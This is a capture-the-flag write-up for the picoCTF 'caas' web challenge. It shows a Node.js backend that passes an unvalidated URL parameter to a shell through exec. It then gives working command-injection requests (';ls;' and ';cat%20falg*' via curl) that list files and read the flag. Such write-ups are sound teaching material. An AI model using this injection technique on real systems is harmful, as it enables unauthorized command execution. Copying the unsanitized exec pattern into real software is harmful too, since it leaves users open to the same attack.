# caas

# caas

#### Description

AUTHOR: BROWNIEINMOTION

Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)

Download [index.js](https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js)

#### Solution

The code on frontend isn't interesting as it's simply making request to backend.

```js
(async () => {
  await new Promise(r => window.addEventListener('load', r));
  document.querySelector('code').textContent =
    `${window.origin}/cowsay/{message}`;
})();
```

Point of interest is the given backend index.js

```js
app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});
```

There's no validation of `message` and it gets directly passed to `exec`

[child\_process.exec(command\[, options\]\[, callback\])](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback):\
&#xNAN;_&#x53;pawns a shell then executes the `command` within that shell, buffering any generated output_

That means we are executing `/usr/games/cowsay ${req.params.message}` in the shell. `cowsay` doesn't have exploits for RCE, even if it did it would be overkill. We can just supply another command to be ran with exec. Using `;` we can seperate commands, let's test it.

```powershell
➜ curl "https://caas.mars.picoctf.net/cowsay/0w0;ls;"
 _____
< 0w0 >
 -----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock

➜ curl "https://caas.mars.picoctf.net/cowsay/0w0;cat%20falg*"
 _____
< 0w0 >
 -----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```

::: tip Flag
`picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
:::

::: info :information_source:
You can't use space character without encoding, %20 is URL encoded space character.
:::
